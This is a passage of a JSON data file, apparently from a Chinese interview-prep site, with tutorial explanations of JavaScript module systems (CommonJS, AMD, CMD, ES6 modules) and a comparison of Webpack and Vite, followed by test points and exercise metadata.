3;\nfunction incCounter() {\n  counter++;\n}\nmodule.exports = {\n  counter: counter,\n  incCounter: incCounter,\n};\n\n```\n\n上面代码输出内部变量counter和改写这个变量的内部方法incCounter。\n\n```js\n// main.js\nvar counter = require('./lib').counter;\nvar incCounter = require('./lib').incCounter;\n\nconsole.log(counter);  // 3\nincCounter();\nconsole.log(counter); // 3\n```\n\n上面代码说明，counter输出以后，lib.js模块内部的变化就影响不到counter了。**这是因为counter是一个原始类型的值，会被缓存。除非写成一个函数，才能得到内部变动后的值**。\n\n#### (5)服务器端实现\n\n#### ①下载安装node.js\n\n#### ②创建项目结构\n\n**注意：用npm init 自动生成package.json时，package name(包名)不能有中文和大写**\n\n```\n|-modules\n  |-module1.js\n  |-module2.js\n  |-module3.js\n|-app.js\n|-package.json\n  {\n    \"name\": \"commonJS-node\",\n    \"version\": \"1.0.0\"\n  }\n```\n\n#### ③下载第三方模块\n\n`npm install uniq --save // 用于数组去重`\n\n#### ④定义模块代码\n\n```js\n//module1.js\nmodule.exports = {\n  msg: 'module1',\n  foo() {\n    console.log(this.msg)\n  }\n}\n```\n\n```js\n//module2.js\nmodule.exports = function() {\n  console.log('module2')\n}\n```\n\n```js\n//module3.js\nexports.foo = function() {\n  console.log('foo() module3')\n}\nexports.arr = [1, 2, 3, 3, 2]\n```\n\n```js\n// app.js文件\n// 引入第三方库，应该放置在最前面\nlet uniq = require('uniq')\nlet module1 = require('./modules/module1')\nlet module2 = require('./modules/module2')\nlet module3 = require('./modules/module3')\n\nmodule1.foo() //module1\nmodule2() //module2\nmodule3.foo() //foo() module3\nconsole.log(uniq(module3.arr)) //[ 1, 2, 3 ]\n```\n\n#### ⑤通过node运行app.js\n\n命令行输入`node app.js`，运行JS文件\n\n#### (6)浏览器端实现(借助Browserify)\n\n#### ①创建项目结构\n\n```\n|-js\n  |-dist //打包生成文件的目录\n  |-src //源码所在的目录\n    |-module1.js\n    |-module2.js\n    |-module3.js\n    |-app.js //应用主源文件\n|-index.html //运行于浏览器上\n|-package.json\n  {\n    \"name\": \"browserify-test\",\n    \"version\": \"1.0.0\"\n  }\n```\n\n#### ②下载browserify\n\n+   全局: npm install browserify -g\n+   局部: npm install browserify --save-dev\n\n#### ③定义模块代码(同服务器端)\n\n注意：`index.html`文件要运行在浏览器上，需要借助browserify将`app.js`文件打包编译，如果直接在`index.html`引入`app.js`就会报错！\n\n#### ④打包处理js\n\n根目录下运行`browserify js/src/app.js -o js/dist/bundle.js`\n\n#### ⑤页面使用引入\n\n在index.html文件中引入`<script type=\"text/javascript\" src=\"js/dist/bundle.js\"></script>`\n\n### 2.AMD\n\nCommonJS规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。AMD规范则是非同步加载模块，允许指定回调函数。由于Node.js主要用于服务器编程，模块文件一般都已经存在于本地硬盘，所以加载起来比较快，不用考虑非同步加载的方式，所以CommonJS规范比较适用。但是，**如果是浏览器环境，要从服务器端加载模块，这时就必须采用非同步模式，因此浏览器端一般采用AMD规范**。此外AMD规范比CommonJS规范在浏览器端实现要来着早。\n\n#### (1)AMD规范基本语法\n\n**定义暴露模块**:\n\n```js\n//定义没有依赖的模块\ndefine(function(){\n   return 模块\n})\n```\n\n```js\n//定义有依赖的模块\ndefine(['module1', 'module2'], function(m1, m2){\n   return 模块\n})\n```\n\n**引入使用模块**:\n\n```js\nrequire(['module1', 'module2'], function(m1, m2){\n   使用m1/m2\n})\n```\n\n#### (2)未使用AMD规范与使用require.js\n\n通过比较两者的实现方法，来说明使用AMD规范的好处。\n\n+   未使用AMD规范\n\n```js\n// dataService.js文件\n(function (window) {\n  let msg = 'www.baidu.com'\n  function getMsg() {\n    return msg.toUpperCase()\n  }\n  window.dataService = {getMsg}\n})(window)\n```\n\n```js\n// alerter.js文件\n(function (window, dataService) {\n  let name = 'Tom'\n  function showMsg() {\n    alert(dataService.getMsg() + ', ' + name)\n  }\n  window.alerter = {showMsg}\n})(window, dataService)\n```\n\n```js\n// main.js文件\n(function (alerter) {\n  alerter.showMsg()\n})(alerter)\n```\n\n```html\n// index.html文件\n<div><h1>Modular Demo 1: 未使用AMD(require.js)</h1></div>\n<script type=\"text/javascript\" src=\"js/modules/dataService.js\"></script>\n<script type=\"text/javascript\" src=\"js/modules/alerter.js\"></script>\n<script type=\"text/javascript\" src=\"js/main.js\"></script>\n```\n\n最后得到如下结果：\n\n![](https://static.ecool.fun//article/55f4b8a1-39f6-4c64-9e93-c0ad1d74a526.awebp)\n\n这种方式缺点很明显：**首先会发送多个请求，其次引入的js文件顺序不能搞错，否则会报错！**\n\n+   使用require.js\n\nRequireJS是一个工具库，主要用于客户端的模块管理。它的模块管理遵守AMD规范，**RequireJS的基本思想是，通过define方法，将代码定义为模块；通过require方法，实现代码的模块加载**。 接下来介绍AMD规范在浏览器实现的步骤：\n\n#### ①下载require.js, 并引入\n\n+   官网: `http://www.requirejs.cn/`\n+   github : `https://github.com/requirejs/requirejs`\n\n然后将require.js导入项目: js/libs/require.js\n\n#### ②创建项目结构\n\n```\n|-js\n  |-libs\n    |-require.js\n  |-modules\n    |-alerter.js\n    |-dataService.js\n  |-main.js\n|-index.html\n```\n\n#### ③定义require.js的模块代码\n\n```js\n// dataService.js文件\n// 定义没有依赖的模块\ndefine(function() {\n  let msg = 'www.baidu.com'\n  function getMsg() {\n    return msg.toUpperCase()\n  }\n  return { getMsg } // 暴露模块\n})\n```\n\n```js\n//alerter.js文件\n// 定义有依赖的模块\ndefine(['dataService'], function(dataService) {\n  let name = 'Tom'\n  function showMsg() {\n    alert(dataService.getMsg() + ', ' + name)\n  }\n  // 暴露模块\n  return { showMsg }\n})\n```\n\n```js\n// main.js文件\n(function() {\n  require.config({\n    baseUrl: 'js/', //基本路径 出发点在根目录下\n    paths: {\n      //映射: 模块标识名: 路径\n      alerter: './modules/alerter', //此处不能写成alerter.js,会报错\n      dataService: './modules/dataService'\n    }\n  })\n  require(['alerter'], function(alerter) {\n    alerter.showMsg()\n  })\n})()\n```\n\n```html\n// index.html文件\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>Modular Demo</title>\n  </head>\n  <body>\n    <!-- 引入require.js并指定js主文件的入口 -->\n    <script data-main=\"js/main\" src=\"js/libs/require.js\"></script>\n  </body>\n</html>\n```\n\n#### ④页面引入require.js模块:\n\n在index.html引入 `<script data-main=\"js/main\" src=\"js/libs/require.js\"></script>`\n\n**此外在项目中如何引入第三方库**？只需在上面代码的基础稍作修改：\n\n```js\n// alerter.js文件\ndefine(['dataService', 'jquery'], function(dataService, $) {\n  let name = 'Tom'\n  function showMsg() {\n    alert(dataService.getMsg() + ', ' + name)\n  }\n  $('body').css('background', 'green')\n  // 暴露模块\n  return { showMsg }\n})\n```\n\n```js\n// main.js文件\n(function() {\n  require.config({\n    baseUrl: 'js/', //基本路径 出发点在根目录下\n    paths: {\n      //自定义模块\n      alerter: './modules/alerter', //此处不能写成alerter.js,会报错\n      dataService: './modules/dataService',\n      // 第三方库模块\n      jquery: './libs/jquery-1.10.1' //注意：写成jQuery会报错\n    }\n  })\n  require(['alerter'], function(alerter) {\n    alerter.showMsg()\n  })\n})()\n```\n\n上例是在alerter.js文件中引入jQuery第三方库，main.js文件也要有相应的路径配置。 **小结**：通过两者的比较，可以得出**AMD模块定义的方法非常清晰，不会污染全局环境，能够清楚地显示依赖关系**。AMD模式可以用于浏览器环境，并且允许非同步加载模块，也可以根据需要动态加载模块。\n\n### 3.CMD\n\nCMD规范专门用于浏览器端，模块的加载是异步的，模块使用时才会加载执行。CMD规范整合了CommonJS和AMD规范的特点。在 Sea.js 中，所有 JavaScript 模块都遵循 CMD模块定义规范。\n\n#### (1)CMD规范基本语法\n\n**定义暴露模块：**\n\n```js\n//定义没有依赖的模块\ndefine(function(require, exports, module){\n  exports.xxx = value\n  module.exports = value\n})\n```\n\n```js\n//定义有依赖的模块\ndefine(function(require, exports, module){\n  //引入依赖模块(同步)\n  var module2 = require('./module2')\n  //引入依赖模块(异步)\n    require.async('./module3', function (m3) {\n    })\n  //暴露模块\n  exports.xxx = value\n})\n```\n\n**引入使用模块：**\n\n```js\ndefine(function (require) {\n  var m1 = require('./module1')\n  var m4 = require('./module4')\n  m1.show()\n  m4.show()\n})\n```\n\n#### (2)sea.js简单使用教程\n\n#### ①下载sea.js, 并引入\n\n+   官网: [seajs.org/](http://seajs.org/ \"http://seajs.org/\")\n+   github : [github.com/seajs/seajs](https://github.com/seajs/seajs \"https://github.com/seajs/seajs\")\n\n然后将sea.js导入项目: js/libs/sea.js\n\n#### ②创建项目结构\n\n```\n|-js\n  |-libs\n    |-sea.js\n  |-modules\n    |-module1.js\n    |-module2.js\n    |-module3.js\n    |-module4.js\n    |-main.js\n|-index.html\n```\n\n#### ③定义sea.js的模块代码\n\n```js\n// module1.js文件\ndefine(function (require, exports, module) {\n  //内部变量数据\n  var data = 'atguigu.com'\n  //内部函数\n  function show() {\n    console.log('module1 show() ' + data)\n  }\n  //向外暴露\n  exports.show = show\n})\n```\n\n```js\n// module2.js文件\ndefine(function (require, exports, module) {\n  module.exports = {\n    msg: 'I Will Back'\n  }\n})\n```\n\n```js\n// module3.js文件\ndefine(function(require, exports, module) {\n  const API_KEY = 'abc123'\n  exports.API_KEY = API_KEY\n})\n```\n\n```js\n// module4.js文件\ndefine(function (require, exports, module) {\n  //引入依赖模块(同步)\n  var module2 = require('./module2')\n  function show() {\n    console.log('module4 show() ' + module2.msg)\n  }\n  exports.show = show\n  //引入依赖模块(异步)\n  require.async('./module3', function (m3) {\n    console.log('异步引入依赖模块3  ' + m3.API_KEY)\n  })\n})\n```\n\n```js\n// main.js文件\ndefine(function (require) {\n  var m1 = require('./module1')\n  var m4 = require('./module4')\n  m1.show()\n  m4.show()\n})\n```\n\n#### ④在index.html中引入\n\n```html\n<script type=\"text/javascript\" src=\"js/libs/sea.js\"></script>\n<script type=\"text/javascript\">\n  seajs.use('./js/modules/main')\n</script>\n```\n\n最后得到结果如下：\n\n![](https://static.ecool.fun//article/1ccecf4a-5e16-4fe7-b072-39630cd8ee84.awebp)\n\n### 4.ES6模块化\n\nES6 模块的设计思想是尽量的静态化，使得编译时就能确定模块的依赖关系，以及输入和输出的变量。CommonJS 和 AMD 模块，都只能在运行时确定这些东西。比如，CommonJS 模块就是对象，输入时必须查找对象属性。\n\n#### (1)ES6模块化语法\n\nexport命令用于规定模块的对外接口，import命令用于输入其他模块提供的功能。\n\n```js\n/** 定义模块 math.js **/\nvar basicNum = 0;\nvar add = function (a, b) {\n    return a + b;\n};\nexport { basicNum, add };\n/** 引用模块 **/\nimport { basicNum, add } from './math';\nfunction test(ele) {\n    ele.textContent = add(99 + basicNum);\n}\n```\n\n如上例所示，使用import命令的时候，用户需要知道所要加载的变量名或函数名，否则无法加载。为了给用户提供方便，让他们不用阅读文档就能加载模块，就要用到export default命令，为模块指定默认输出。\n\n```js\n// export-default.js\nexport default function () {\n  console.log('foo');\n}\n```\n\n```js\n// import-default.js\nimport customName from './export-default';\ncustomName(); // 'foo'\n```\n\n模块默认输出, 其他模块加载该模块时，import命令可以为该匿名函数指定任意名字。\n\n#### (2)ES6 模块与 CommonJS 模块的差异\n\n它们有两个重大差异：\n\n**① CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用**。\n\n**② CommonJS 模块是运行时加载，ES6 模块是编译时输出接口**。\n\n第二个差异是因为 CommonJS 加载的是一个对象（即module.exports属性），该对象只有在脚本运行完才会生成。而 ES6 模块不是对象，它的对外接口只是一种静态定义，在代码静态解析阶段就会生成。\n\n下面重点解释第一个差异，我们还是举上面那个CommonJS模块的加载机制例子:\n\n```js\n// lib.js\nexport let counter = 3;\nexport function incCounter() {\n  counter++;\n}\n// main.js\nimport { counter, incCounter } from './lib';\nconsole.log(counter); // 3\nincCounter();\nconsole.log(counter); // 4\n```\n\nES6 模块的运行机制与 CommonJS 不一样。**ES6 模块是动态引用，并且不会缓存值，模块里面的变量绑定其所在的模块**。\n\n#### (3) ES6-Babel-Browserify使用教程\n\n简单来说就一句话：**使用Babel将ES6编译为ES5代码，使用Browserify编译打包js**。\n\n#### ①定义package.json文件\n\n```\n {\n   \"name\" : \"es6-babel-browserify\",\n   \"version\" : \"1.0.0\"\n }\n```\n\n#### ②安装babel-cli, babel-preset-es2015和browserify\n\n+   npm install babel-cli browserify -g\n+   npm install babel-preset-es2015 --save-dev\n+   preset 预设(将es6转换成es5的所有插件打包)\n\n#### ③定义.babelrc文件\n\n```\n  {\n    \"presets\": [\"es2015\"]\n  }\n```\n\n#### ④定义模块代码\n\n```js\n//module1.js文件\n// 分别暴露\nexport function foo() {\n  console.log('foo() module1')\n}\nexport function bar() {\n  console.log('bar() module1')\n}\n```\n\n```js\n//module2.js文件\n// 统一暴露\nfunction fun1() {\n  console.log('fun1() module2')\n}\nfunction fun2() {\n  console.log('fun2() module2')\n}\nexport { fun1, fun2 }\n```\n\n```js\n//module3.js文件\n// 默认暴露 可以暴露任意数据类项，暴露什么数据，接收到就是什么数据\nexport default () => {\n  console.log('默认暴露')\n}\n```\n\n```js\n// app.js文件\nimport { foo, bar } from './module1'\nimport { fun1, fun2 } from './module2'\nimport module3 from './module3'\nfoo()\nbar()\nfun1()\nfun2()\nmodule3()\n```\n\n#### ⑤ 编译并在index.html中引入\n\n+   使用Babel将ES6编译为ES5代码(但包含CommonJS语法) : `babel js/src -d js/lib`\n+   使用Browserify编译js : `browserify js/lib/app.js -o js/lib/bundle.js`\n\n然后在index.html文件中引入\n\n```html\n <script type=\"text/javascript\" src=\"js/lib/bundle.js\"></script>\n```\n\n最后得到如下结果：\n\n![](https://static.ecool.fun//article/59383bf5-aaa9-43d8-a0ab-3ef0205817cc.awebp)\n\n**此外第三方库(以jQuery为例)如何引入呢**？ 首先安装依赖`npm install jquery@1` 然后在app.js文件中引入\n\n```\n//app.js文件\nimport { foo, bar } from './module1'\nimport { fun1, fun2 } from './module2'\nimport module3 from './module3'\nimport $ from 'jquery'\n\nfoo()\nbar()\nfun1()\nfun2()\nmodule3()\n$('body').css('background', 'green')\n```\n\n## 三、总结\n\n+   CommonJS规范主要用于服务端编程，加载模块是同步的，这并不适合在浏览器环境，因为同步意味着阻塞加载，浏览器资源是异步加载的，因此有了AMD CMD解决方案。\n+   AMD规范在浏览器环境中异步加载模块，而且可以并行加载多个模块。不过，AMD规范开发成本高，代码的阅读和书写比较困难，模块定义方式的语义不顺畅。\n+   CMD规范与AMD规范很相似，都用于浏览器编程，依赖就近，延迟执行，可以很容易在Node.js中运行。不过，依赖SPM 打包，模块的加载逻辑偏重\n+   **ES6 在语言标准的层面上，实现了模块功能，而且实现得相当简单，完全可以取代 CommonJS 和 AMD 规范，成为浏览器和服务器通用的模块解决方案**。\n",
    "testPoint": "1. **模块化的概念与重要性**：理解模块化的基本原则，以及它如何帮助开发者组织和管理代码。\n\n2. **CommonJS与AMD的区别**：掌握CommonJS（如Node.js中的模块系统）和AMD（如RequireJS）的加载机制和使用场景。\n\n3. **ES6模块化的语法**：熟悉`import`和`export`语句的使用，以及默认导出和命名导出的区别。\n\n4. **模块的动态导入**：了解如何使用`import()`进行模块的动态加载，以及它在代码分割和懒加载中的应用。\n\n5. **模块打包工具**：了解Webpack、Rollup等模块打包工具的基本配置和使用，以及它们如何处理依赖和打包优化。\n\n6. **循环依赖的处理**：讨论在模块化开发中如何处理循环依赖的问题，以及不同模块化规范下的解决方案。\n\n7. **UMD模块的定义**：理解UMD（Universal Module Definition）的概念，以及它如何使模块在不同环境下（如浏览器和Node.js）都能正常工作。\n\n8. **模块化的最佳实践**：探讨在项目中应用模块化的最佳实践，如单一职责原则、模块间的松耦合等。\n\n",
    "exerciseKeyList": "[\"f5f2f81e-c0c8-409e-ba00-3f3428ae535b\",\"8ecafda7-0ae6-40bd-b8c6-385d02fa7165\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2024-10-05T09:16:05.000Z",
    "updateAt": "2025-07-17T15:20:08.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "8ecafda7-0ae6-40bd-b8c6-385d02fa7165",
        "title": "说说你对JS的模块化方案的了解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-03T05:30:11.000Z",
        "updateAt": "2024-08-10T17:06:47.000Z"
      },
      {
        "exerciseKey": "f5f2f81e-c0c8-409e-ba00-3f3428ae535b",
        "title": "说说你对模块化方案的理解，比如 CommonJS、AMD、CMD、ES Module 分别是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:42:00.000Z",
        "updateAt": "2024-08-10T17:07:03.000Z"
      }
    ]
  },
  "109": {
    "id": 109,
    "tagId": 28,
    "title": "Webpack与Vite",
    "explanation": "\n## 前言\n\n**vite比webpack快？**\n\n**vite比webpack简单？**\n\n**今天我们就来分析一下，到底有什么不一样的地方！**\n\n## 定位\n\n对比之前，我们先要搞懂，vite与webpack的定位以及关系才可以。\n\n那前端社区中常谈到的这些工具`webpack`、`rollup`、`parcel`、`esbuild`、`vite`、`vue-cli`、`create-react-app`、`umi`他们之间的关系是怎样的。\n\n+   `webpack`、`rollup`、`parcel`、`esbuild`都是打包工具，代码写好之后，我们需要对代码进行`压缩`、`合并`、`转换`、`分割`、`打包`等操作，这些工作需要打包工具去完成。\n+   `vue-cli`、`create-react-app`、`umi` 是基于`webpack`的上层封装，通过简单的配置就可以快速创建出一个项目，把更多的时间放在业务开发上。\n+   `vite`开发环境依赖`esbuild`进行预构建，生产环境则依赖`rollup`进行打包，并且充分利用了现代浏览器的特性，比如`http2`、`ES module`，`vite`是站在众多巨人肩膀上的一个产物， 类似`webpack + webpack-dev-server`的结合体，是一个非常棒的前端项目的构建工具。\n\n## 运行原理\n\n首先，我们从运行原理上分析一下，vite为什么比webpack快。\n\n**webpack运行原理**\n\n![n1PETD](https://static.ecool.fun//article/0dde0593-ae36-48df-9287-d7a836273652.)\n\n当我们使用webpack启动项目时，webpack会根据我们配置文件（`webpack.config.js`） 中的入口文件（`entry`），分析出项目项目所有依赖关系，然后打包成一个文件（`bundle.js`），交给浏览器去加载渲染。\n\n这样就会带来一个问题，项目越大，需要打包的东西越多，启动时间越长。\n\n**关于`ES module`**\n\n在讲vite运行原理之前，我们先说一下`ES module`\n\n目前，绝大多数现代浏览器都已经支持`ES module`了， 我们只需要在`<script>`标签中添加`type=\"module\"`，就可以使用`ES module`了。\n\n下面这段代码是可以直接在浏览器中运行的。\n\n```javascript\n// test.js\nexport default function hello() {\n  console.log('hello world');\n}\n\n// index.html\n<script type=\"module\">\n  import hello from './test.js';\n\n  hello(); // hello world\n</scirpt>\n```\n\n**vite运行原理**\n\n![EmFj1C](https://static.ecool.fun//article/bd9fed20-ce07-4d1b-bfbe-cef17e7822a2.)\n\n在`<script type=\"module\">`中，浏览器遇到内部的import引用时，会自动发起http请求，去加载对应的模块。\n\nvite也正是利用了`ES module`这个特性，使用vite运行项目时，首先会用`esbuild`进行预构建，将所有模块转换为`es module`，不需要对我们整个项目进行编译打包，而是在浏览器需要加载某个模块时，拦截浏览器发出的请求，根据请求进行`按需编译`，然后返回给浏览器。\n\n这样一来，首次启动项目（冷启动）时，自然也就比webpack快很多了，并且项目大小对vite启动速度的影响也很小。\n\n## 构建方式\n\n我们再来看一下，vite与webpack在项目构建上有哪些区别。\n\n**webpack**\n\nwebpack是基于`nodejs`运行的，但`js`只能单线程运行，无法利用多核CPU的优势，当项目越来越大时，构建速度也就越来越慢了。\n\n**vite**\n\nvite`预构建`与`按需编译`的过程，都是使用`esbuild`完成的。\n\n`esbuild`是用`go`语言编写的，可以充分利用多核CPU的优势，所以vite开发环境下的`预构建`与`按需编译`速度，都是非常快的。\n\n## http2\n\nvite充分利用了http2可以并发请求的优势，这也是速度快的一个主要原因。 接下来，我们了解一下**http2**的来龙去脉。\n\n在之前http1的时候，浏览器对同一个域名的请求，是有并发限制的，一般为6个，如果并发请求6个以上，就会造成阻塞问题，所以在http1的时代，我们要减少打包产物的文件数量，减少并发请求，来提高项目的加载速度。\n\n2015年以后，http2出现了，他可以并发发送多个请求，不会出现http1的并发限制。这时候，将打包产物分成多个小模块，并行去加载，反而会更快。\n\nvite也充分利用了这一优势，对项目资源进行了合理的拆分，访问项目时，同时加载多个模块，来提升项目访问速度。\n\n## 热更新\n\nvite速度快的另一个原因是与webpack不同的热更新机制。\n\n**我们首先来了解一下什么是HMR。**\n\n模块热替换(hot module replacement - HMR)，该功能可以实现应用程序运行过程中，替换、添加或删除模块，而无需重新加载整个页面，也就是我们常说的`热更新`。\n\nvite与webpack虽然都支持HMR,但两个工具的实现原理是不一样的。\n\n**webpack**\n\nwebpack项目中，每次修改文件，都会对整个项目重新进行打包，这对大项目来说，是非常不友好的。\n\n虽然webpack现在有了缓存机制，但还是无法从根本上解决这个问题。\n\n**vite**\n\nvite项目中，监听到文件变更后，会用`websocket`通知浏览器，重新发起新的请求，只对该模块进行重新编译，然后进行替换。\n\n并且基于`es module`的特性，vite利用浏览器的缓存策略，针对源码模块（我们自己写的代码）做了`协商缓存`处理，针对依赖模块（第三方库）做了`强缓存`处理，这样我们项目的访问的速度也就更快了。\n\n## 生产环境\n\n**vite生产环境下，为什么使用rollup打包呢？**\n\nRollup 是一款 `ES Module` 打包器， 从作用上来看，`Rollup` 与 `Webpack` 非常类似。不过相比于 `Webpack`，`Rollup`要小巧的多，打包生成的文件更小。 因为小巧，自然在这种特定的打包环境下，`Rollup`的打包速度也要比 `Webpack` 快很多。\n\nvite正是基于`es module`的特性实现的，所以使用rollup要更合适一些。\n\n**vite生产环境下，为什么不用esbuild打包呢？**\n\n尽管esbuild的打包速度比rollup更快，但 Vite 目前的插件 API 与使用 esbuild 作为打包器并不兼容，rollup插件api与基础建设更加完善，所以在生产环境vite使用rollup打包会更稳定一些。\n\n如果后面esbuild基础建设与生态更加完善后，esbuild还是更有优势的。\n\n所以使用vite可能会带来开发环境与生产环境打包结果不一致的问题。\n\n## 使用成本\n\n除了速度上的区别，我们再分析一下，vite与webpack的使用成本。\n\n**webpack**\n\n如果我们使用webpack自己去搭建项目脚手架时，需要配置比较多的东西， 比如：`跨域`、`代码压缩`、`代码分割`、`css预处理器的代码转换`、`样式兼容性`、`vue/react代码解析`、`图片压缩`、`代码热更新`、`es降级`、`ts转换`等等，远不止这些。\n\n概念和配置项太多，我们需要了解各种loader、plugin的使用，并且需要根据项目场景，对配置不断进行优化，心智负担太大。\n\n所以就出现了一些基于webpack上层封装的脚手架，如：`vue-cli`、`create-react-app`、`umi`等。\n\n**vite**\n\nvite对我们常用功能都做了内置，比如：`css 预处理器`、`html 预处理器`、`hash 命名`、`异步加载`、`分包`、`压缩`、`HMR`等等，我们可以很轻松的通过配置项去配置。\n\n并且vite官方也提供了一些官方模板、社区模板，我们可以快速地创建出一个带有最佳预设项目，不需要关心太多的配置项。\n\nvite的出现，降低了我们的学习成本、增加了开发体验，我们就可以把更多的时间放在业务开发上了，打磨出更好产品。\n\n",
    "testPoint": "\n**Webpack**：\n\n1. Webpack的基本概念和工作流程。\n2. Webpack配置文件（webpack.config.js）的编写和常用配置项。\n3. Loaders（加载器）的作用和使用场景，如babel-loader、css-loader等。\n4. Plugins（插件）的作用和使用场景，如HtmlWebpackPlugin、CleanWebpackPlugin等。\n5. Webpack的模块热替换（HMR）原理和应用。\n6. Webpack的性能优化策略，如代码分割、懒加载、Tree Shaking等。\n7. Webpack Dev Server的使用和配置。\n\n**Vite**：\n\n1. Vite的基本概念和优势，如极速启动、按需编译等。\n2. Vite与Webpack的区别和适用场景。\n3. Vite的配置文件（vite.config.js）的编写和常用配置项。\n4. Vite对现代JavaScript特性的支持，如ESM（ES Modules）。\n5. Vite的插件系统和常用插件的使用。\n6. Vite的开发服务器特性和模块热替换（HMR）支持。\n7. Vite的生产构建流程和优化策略。\n\n",
    "exerciseKeyList": "[\"45b15dc2-e189-4d3a-80b3-b65bef138ccb\",\"4cf47e01-92e5-4e04-ab83-f4eca1953e23\",\"a2580d1e-90e9-48bc-b93c-247425fb3e5f\",\"03d5dfc7-9bb9-4129-9145-b4da4d4fa11f\",\"af816690-2a3c-4685-a562-991e3040af15\",\"b8ef6782-9f7e-4bb2-824f-3e0259322dae\",\"3c6c5215-5db9-45ea-b2c1-6cc1c6aa6acd\",\"59ec4023-36a6-42dd-a0d7-e35d6f3a49ef\",\"1db9414f-b160-4cf6-9a3c-32d8b7acb4ff\",\"ce8cb922-4de0-429b-9036-63d1dc387af9\",\"c4765da3-f74e-4190-b3c0-7b66f5cd05b0\",\"9211a856-9131-4bb9-b7a3-e876bb528ee7\",\"fe099894-7e1f-4b13-bc0a-8f065b7b4616\",\"6ccbf43f-c512-4e3c-82ce-fe925b8a0c07\",\"9caf3dd4-c7a3-44a1-98ee-37566a737c58\",\"9dc34a20-34be-4c0f-a401-71d936cf4958\",\"17a8d905-1699-4e11-a5a1-c5165115de48\",\"fcdd893d-e614-47c9-9876-1d2a21af556d\",\"b4fc51b1-88d0-4213-80a0-49a5d9c6b9f4\",\"dc78e2f9-568a-445d-988c-594092179848\",\"0d0de429-d6eb-4eda-a614-0a3a22c05237\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-05T09:21:48.000Z",
    "updateAt": "2025-07-17T15:20:30.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "03d5dfc7-9bb9-4129-9145-b4da4d4fa11f",
        "title": "说说webpack proxy工作原理？为什么能解决跨域?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T15:33:37.000Z",
        "updateAt": "2024-01-25T19:07:54.000Z"
      },
      {
        "exerciseKey": "0d0de429-d6eb-4eda-a614-0a3a22c05237",
        "title": "说下Vite的原理",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-20T04:42:55.000Z",
        "updateAt": "2024-08-10T17:06:34.000Z"
      },
      {
        "exerciseKey": "17a8d905-1699-4e11-a5a1-c5165115de48",
        "title": "Webpack中 loader的作用是什么，以及常用loader有哪些",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T14:50:44.000Z",
        "updateAt": "2021-07-07T00:10:43.000Z"
      },
      {
        "exerciseKey": "1db9414f-b160-4cf6-9a3c-32d8b7acb4ff",
        "title": "说说你对webpack的理解？解决了什么问题？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T15:29:41.000Z",
        "updateAt": "2024-01-25T19:05:21.000Z"
      },
      {
        "exerciseKey": "3c6c5215-5db9-45ea-b2c1-6cc1c6aa6acd",
        "title": "说说webpack中常见的Loader？解决了什么问题？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T15:31:33.000Z",
        "updateAt": "2024-01-25T19:06:19.000Z"
      },
      {
        "exerciseKey": "45b15dc2-e189-4d3a-80b3-b65bef138ccb",
        "title": "与webpack类似的工具还有哪些？区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T15:34:59.000Z",
        "updateAt": "2024-08-10T17:05:11.000Z"
      },
      {
        "exerciseKey": "4cf47e01-92e5-4e04-ab83-f4eca1953e23",
        "title": "如何提高webpack的构建速度？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T15:34:30.000Z",
        "updateAt": "2025-08-04T06:29:00.000Z"
      },
      {
        "exerciseKey": "59ec4023-36a6-42dd-a0d7-e35d6f3a49ef",
        "title": "说说webpack的构建流程?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T15:31:03.000Z",
        "updateAt": "2024-01-25T19:05:55.000Z"
      },
      {
        "exerciseKey": "6ccbf43f-c512-4e3c-82ce-fe925b8a0c07",
        "title": "webpack的Loader和Plugin的不同",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T14:56:11.000Z",
        "updateAt": "2021-07-07T00:10:52.000Z"
      },
      {
        "exerciseKey": "9211a856-9131-4bb9-b7a3-e876bb528ee7",
        "title": "如何用webpack来优化前端性能",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T14:58:19.000Z",
        "updateAt": "2024-07-18T18:23:11.000Z"
      },
      {
        "exerciseKey": "9caf3dd4-c7a3-44a1-98ee-37566a737c58",
        "title": "webpack有哪些常见的Plugin",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T14:55:14.000Z",
        "updateAt": "2021-07-07T00:10:49.000Z"
      },
      {
        "exerciseKey": "9dc34a20-34be-4c0f-a401-71d936cf4958",
        "title": "webpack、rollup、parcel优劣",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T14:53:32.000Z",
        "updateAt": "2021-07-07T00:10:46.000Z"
      },
      {
        "exerciseKey": "a2580d1e-90e9-48bc-b93c-247425fb3e5f",
        "title": "说说如何借助webpack来优化前端性能？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T15:34:06.000Z",
        "updateAt": "2024-08-10T17:05:10.000Z"
      },
      {
        "exerciseKey": "af816690-2a3c-4685-a562-991e3040af15",
        "title": "说说webpack的热更新是如何做到的？原理是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T15:33:08.000Z",
        "updateAt": "2024-01-25T19:07:36.000Z"
      },
      {
        "exerciseKey": "b4fc51b1-88d0-4213-80a0-49a5d9c6b9f4",
        "title": "说一下 vite 的构建流程",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-17T10:51:38.000Z",
        "updateAt": "2024-08-10T17:07:36.000Z"
      },
      {
        "exerciseKey": "b8ef6782-9f7e-4bb2-824f-3e0259322dae",
        "title": "说说webpack中常见的Plugin？解决了什么问题？",
